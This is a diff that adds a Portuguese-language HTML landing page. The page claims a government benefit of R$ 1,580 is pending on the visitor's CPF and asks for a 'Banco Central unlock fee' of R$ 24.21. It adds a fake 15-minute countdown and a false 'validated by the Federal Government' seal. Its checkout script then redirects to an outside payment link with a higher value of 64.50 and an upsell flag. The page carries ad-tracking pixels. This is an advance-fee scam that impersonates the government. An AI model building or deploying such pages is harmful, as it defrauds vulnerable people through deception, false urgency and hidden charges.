@@ -1,0 +1,216 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Desbloqueio de Benefício</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+<style>
+  .fds {
+    background-color: rgb(20 81 180);
+}
+</style></head>
+
+<body class="bg-gray-100 min-h-screen flex justify-center items-center p-4">
+    
+    
+  <script>
+  window.pixelId = "692cedccf1d8644d9b7bb3bc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    
+    
+  <main class="bg-white  rounded-lg shadow-md border border-gray-200 text-gray-800 font-sans">
+    <!-- Header -->
+    <header class="fds rounded-t-lg flex items-center gap-3 px-5 py-3">
+      <div class="text-white flex items-center space-x-2">
+      <img src="page.html/images/logo.png" alt="">  
+      </div>
+      <div class="text-white font-bold text-lg ml-auto">Benefício Identificado</div>
+    </header>
+
+    <!-- Content -->
+    <section class="px-6 pt-6 pb-8 space-y-5">
+      <!-- Title -->
+      <h2 class="text-center text-xl font-semibold text-gray-900">Desbloqueio de Benefício</h2>
+
+      <!-- Alert box -->
+      <div class="flex gap-3 items-center bg-blue-50 border border-blue-300 rounded-md p-3">
+<img width="30px" src="page.html/images/978e6da821929b17dd20917b432c09989a8c6bf8.png" alt="" class="sino-animado">
+        <p class="text-sm text-blue-900 font-semibold leading-snug">
+          URGENTE: Benefício do Governo 
+          <span class="whitespace-nowrap">pendente para liberação</span>
+        </p>
+      </div>
+
+<style>
+  @keyframes pulse {
+    0%, 100% {
+      transform: scale(1);
+    }
+    50% {
+      transform: scale(1.08);
+    }
+  }
+
+  @keyframes swing {
+    0% { transform: rotate(0deg); }
+    25% { transform: rotate(10deg); }
+    50% { transform: rotate(0deg); }
+    75% { transform: rotate(-10deg); }
+    100% { transform: rotate(0deg); }
+  }
+
+  .sino-animado {
+    animation: pulse 2s ease-in-out infinite, swing 2s ease-in-out infinite;
+    transform-origin: top center;
+    display: inline-block;
+  }
+</style>
+
+      <!-- Info text with highlight -->
+      <p class="text-gray-700 text-sm leading-relaxed">
+        Foi identificado um <strong class="text-green-700">benefício disponível</strong> em seu CPF que necessita de liberação imediata.
+      </p>
+
+      <!-- Protocol -->
+      <p class="text-gray-500 text-xs">Protocolo: <span class="font-medium text-gray-600">#BF2025-4897</span></p>
+
+      <!-- Value of benefit -->
+      <div class="border border-gray-200 rounded-md p-5 bg-gray-50 text-center">
+        <p class="text-sm text-gray-700 mb-1">Valor do benefício disponível:</p>
+        <div class="text-3xl font-extrabold text-green-700">R$ 1.580,00</div>
+      </div>
+
+<!-- Timer attention -->
+<div class="flex items-center gap-3 text-sm text-gray-700">
+  <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-blue-600 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="M12 8v4l3 3"></path>
+    <circle cx="12" cy="12" r="10"></circle>
+  </svg>
+  <p>
+    Atenção: Benefício expira em <span class="font-semibold" id="timer-text">15:00</span>
+  </p>
+</div>
+<script>
+  // Carregar valor aprovado do localStorage
+        const valorAprovado =
+          localStorage.getItem("creditoAprovado") || "7.584,00";
+        document.getElementById("approvedAmount").textContent =
+          "R$ " + valorAprovado;
+</script>
+<!-- Barra de progresso -->
+<div class="w-full h-1 rounded bg-blue-300 overflow-hidden shadow-inner">
+  <div id="progress-bar" class="bg-blue-700 h-full" style="width: 100%;"></div>
+</div>
+<script>
+  const totalSeconds = 15 * 60; // 15 minutos
+  let remainingSeconds = totalSeconds;
+
+  const timerText = document.getElementById('timer-text');
+  const progressBar = document.getElementById('progress-bar');
+
+  function updateTimer() {
+    const minutes = Math.floor(remainingSeconds / 60);
+    const seconds = remainingSeconds % 60;
+    timerText.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+
+    const percent = (remainingSeconds / totalSeconds) * 100;
+    progressBar.style.width = `${percent}%`;
+
+    if (remainingSeconds <= 0) {
+      clearInterval(timerInterval);
+      timerText.textContent = "00:00";
+      progressBar.style.width = "0%";
+    } else {
+      remainingSeconds--;
+    }
+  }
+
+  updateTimer(); // run once immediately
+  const timerInterval = setInterval(updateTimer, 1000);
+</script>
+
+      <!-- Payment section -->
+      <div class="bg-blue-50 border border-blue-200 rounded-md p-5 space-y-2 text-center">
+        <p class="text-gray-700 text-sm">
+          Para receber o benefício, é necessário realizar a validação de segurança através do pagamento da 
+          <strong>Taxa de Desbloqueio do Banco Central</strong>:
+        </p>
+        <p class="line-through text-gray-400 text-lg mt-1">R$ 194,90</p>
+        <p class="text-3xl font-extrabold text-blue-800">R$ 24,21</p>
+        <p class="text-xs text-gray-600 font-medium">Valor promocional - Liberação imediata</p>
+      </div>
+
+      <!-- Benefits list -->
+      <div>
+        <p class="font-semibold text-gray-800 mb-2">Após o desbloqueio você poderá:</p>
+        <ul class="list-disc list-inside text-gray-700 text-sm space-y-1">
+          <li>Receber o benefício em até <span class="font-semibold">12 horas</span> <span aria-hidden="true">✔</span></li>
+          <li>Acessar outros <span class="font-semibold">benefícios disponíveis</span> <span aria-hidden="true">✔</span></li>
+          <li>Escolher a conta para depósito <span aria-hidden="true">✔</span></li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Button + footer -->
+    <footer class="px-6 pb-6">
+      <button id="btnSaque" class="w-full bg-blue-800 text-white font-semibold py-3 rounded-md hover:bg-blue-900 transition-colors duration-200 focus:outline-none focus:ring-4 focus:ring-blue-400" style=" display: flex
+;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 12px;
+    justify-content: center;
+    border: 1px solid #ccc;
+    color: white;
+    background: rgb(20 81 180);
+    border-radius: 7px;
+    padding: 10px;" onclick="checkout()">
+  <svg xmlns="http://www.w3.org/2000/svg" class="inline-block w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+    <path d="M7 11V7a5 5 0 0 1 9.9-1"></path>
+  </svg>
+  
+        DESBLOQUEAR BENEFÍCIO
+</button>
+  <script>
+  function checkout() {
+    const urlParams = new URLSearchParams(window.location.search);
+              
+            document.getElementById("btnSaque").disabled = true;  
+    // Remove o value antigo da URL
+    urlParams.delete("value");
+
+    // Monta a nova URL com o novo value
+    urlParams.set("value", "64.50");
+
+    urlParams.set("upsell", "1");
+    urlParams.set("produto_id", "299");
+    // Redireciona
+    const destino = "https://www.pay-pagamentos.link/checkout/dea18ab4-33a6-4ce7-a5ee-992d092c564e?" + urlParams.toString();
+    window.location.href = destino;
+  };
+</script>
+<div style="display: flex;justify-content: center;/*! position: fixed; */align-items: baseline;"><p class="text-center text-xs text-gray-500 mt-2 select-none">
+        Transação segura e validada pelo Governo Federal
+       
+      </p>
+       <svg style="margin-left:10px;" xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="currentColor" class="bi bi-shield-fill" viewBox="0 0 16 16">
+  <path d="M5.072.56C6.157.265 7.31 0 8 0s1.843.265 2.928.56c1.11.3 2.229.655 2.887.87a1.54 1.54 0 0 1 1.044 1.262c.596 4.477-.787 7.795-2.465 9.99a11.8 11.8 0 0 1-2.517 2.453 7 7 0 0 1-1.048.625c-.28.132-.581.24-.829.24s-.548-.108-.829-.24a7 7 0 0 1-1.048-.625 11.8 11.8 0 0 1-2.517-2.453C1.928 10.487.545 7.169 1.141 2.692A1.54 1.54 0 0 1 2.185 1.43 63 63 0 0 1 5.072.56"></path>
+</svg></div>
+      
+    </footer>
+  </main>
+
+
+
+</body></html>
